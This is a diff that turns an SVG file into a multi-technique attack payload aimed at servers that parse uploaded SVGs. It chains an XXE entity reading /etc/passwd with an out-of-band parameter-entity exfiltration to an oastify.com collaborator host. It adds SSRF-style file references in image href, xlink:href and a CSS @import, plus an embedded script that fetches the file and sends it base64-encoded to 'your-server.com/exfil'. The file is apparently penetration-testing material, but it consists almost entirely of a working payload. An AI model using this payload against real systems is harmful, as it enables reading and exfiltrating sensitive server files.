@@ -1,13 +1,34 @@
+<?xml version="1.0"?>
 <!DOCTYPE svg [
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>]>
-<svg width="800" height="600" xmlns="http://www.w3.org/2000/svg">
-  <style>
-    text {
-      font-family: "Courier", monospace;
-      font-size: 16px;
-      fill: black;
-    }
-  </style>
-  <text x="10" y="20" xml:space="preserve">&file_content;</text>
-</svg>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://uec57sxgcy67tol1tv0v8pls6jca01ypn.oastify.com/?data=%file;'>">
+  %eval;
+  %exfil;
+]>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="800" height="800">
+  <!-- XXE Injection displaying /etc/passwd -->
+  <text x="10" y="20" font-size="14">&xxe;</text>
+  
+  <!-- Image href SSRF -->
+  <image href="file:///etc/passwd" x="0" y="40" width="400" height="100"/>
 
+  <!-- xlink:href SSRF -->
+  <image xlink:href="file:///etc/passwd" x="0" y="160" width="400" height="100"/>
+
+  <!-- CSS Import SSRF -->
+  <style>@import url("file:///etc/passwd");</style>
+
+  <!-- JavaScript Payload (Rare cases when SVG is rendered in browser context) -->
+  <script><![CDATA[
+    fetch('file:///etc/passwd')
+      .then(response => response.text())
+      .then(data => fetch('https://your-server.com/exfil?data=' + btoa(data)));
+  ]]></script>
+
+  <!-- DTD-based XXE exfiltration -->
+  <!-- This will trigger %exfil defined in the DTD -->
+
+</svg>
